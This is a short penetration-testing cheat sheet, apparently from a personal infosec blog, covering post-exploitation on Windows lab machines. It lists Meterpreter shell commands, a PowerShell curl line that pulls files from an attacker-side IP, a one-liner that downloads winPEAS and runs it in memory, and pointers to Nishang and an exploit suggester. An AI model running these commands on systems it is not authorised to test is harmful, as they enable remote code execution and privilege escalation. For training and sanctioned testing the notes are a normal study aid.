---
layout: single
classes: #wide
title: "Windows Boxes"
sidebar:
    title: "Windows Boxes"
    nav: infosec
collection: infopages
permalink: /infosec/windows/
toc: true
toc_sticky: true
author_profile: true
---

# Powershell
`powershell -c "Command"`  
`Get-ChildItem -Path . *.txt -Recurse` - search for file (this case .txt)

## Meterpreter
`load powershell` - loads into meterpreter  
`powershell_shell`  
`shell`  

# Post shells
Uploading files: 
`powershell -c "curl 10.13.53.1:9999/$file -OutFile $file"`

# Winpeas
[Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS):  
url =   
`$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" `  
One liner to download and execute winPEASany from memory in a PS shell  
`$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") `   

less -r file (make color coded for viewing output file of winpeas)

# Nishang
contains: 
* execution
* excalation
* backdoors
* bypass
* Scans
* shells
* and more (website [here](https://github.com/samratashok/nishang))

# wes - exploit checker for win
`systeminfo > txt`  
`wes txt` -   [site](https://github.com/bitsadmin/wesng)



